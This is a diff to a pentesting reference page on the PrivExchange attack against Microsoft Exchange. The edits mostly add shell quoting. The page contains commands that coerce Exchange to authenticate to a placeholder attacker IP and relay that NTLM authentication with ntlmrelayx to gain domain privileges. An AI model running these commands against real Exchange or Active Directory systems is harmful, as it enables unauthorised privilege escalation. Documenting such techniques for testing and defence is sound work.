@@ -14,7 +14,7 @@ category: ad
 [PrivExchange](https://github.com/dirkjanm/privexchange/) (Python) is a tool able to log in on Exchange Web Services and call that API.
 
 ```bash
-privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET
+privexchange.py -d "$DOMAIN" -u "$DOMAIN_USER" -p "$PASSWORD" -ah "$ATTACKER_IP" "$EXCHANGE_SERVER_TARGET"
 ```
 
 > [!TIP]
@@ -29,7 +29,7 @@ privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EX
 > sed -i 's/attacker_url = .*$/attacker_url = "$ATTACKER_URL"/' httpattack.py
 > cd /PATH/TO/impacket
 > pip3 install .
-> ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx
+> ntlmrelayx.py -t "https://$EXCHANGE_HOST/EWS/Exchange.asmx"
 > ```
 
 > [!NOTE]
